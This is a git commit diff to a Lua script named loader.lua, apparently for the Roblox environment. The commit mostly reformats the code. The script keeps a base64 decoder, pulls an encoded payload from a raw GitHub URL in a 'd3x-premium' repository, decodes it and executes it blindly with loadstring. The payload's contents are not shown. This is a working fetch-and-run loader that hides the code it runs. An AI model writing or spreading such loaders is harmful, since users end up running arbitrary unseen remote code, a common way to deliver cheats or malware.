1dd90bd30da9ab7664254c91a67fafc541a97283
xwwuhq <zlx336@gmail.com>
2026-01-17 13:56:46 +0100

    Update loader.lua

--- loader.lua
+++ loader.lua
@@ -1,26 +1,26 @@
 local function b64decode(data)
-    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-    data = string.gsub(data, '[^'..b..'=]', '')
+    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    data = data:gsub('[^'..b..'=]', '')
+
     return (data:gsub('.', function(x)
-        if (x == '=') then return '' end
-        local r,f='',(b:find(x)-1)
-        for i=6,1,-1 do
-            r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0')
+        if x == '=' then return '' end
+        local r, f = '', (b:find(x) - 1)
+        for i = 6, 1, -1 do
+            r = r .. ((f % 2^i - f % 2^(i-1) > 0) and '1' or '0')
         end
-        return r;
-    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
-        if (#x ~= 8) then return '' end
-        local c=0
-        for i=1,8 do
-            c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0)
+        return r
+    end):gsub('%d%d%d%d%d%d%d%d', function(x)
+        local c = 0
+        for i = 1, 8 do
+            c = c + ((x:sub(i, i) == '1') and 2^(8-i) or 0)
         end
         return string.char(c)
     end))
 end
 
-local URL = "https://raw.githubusercontent.com/xwwuhq/d3x-premium/main/payload.txt"
+local payloadURL = "https://raw.githubusercontent.com/xwwuhq/d3x-premium/main/payload.txt"
 
-local raw = game:HttpGet(URL)
+local raw = game:HttpGet(payloadURL)
 local decoded = b64decode(raw)
 
 loadstring(decoded)()
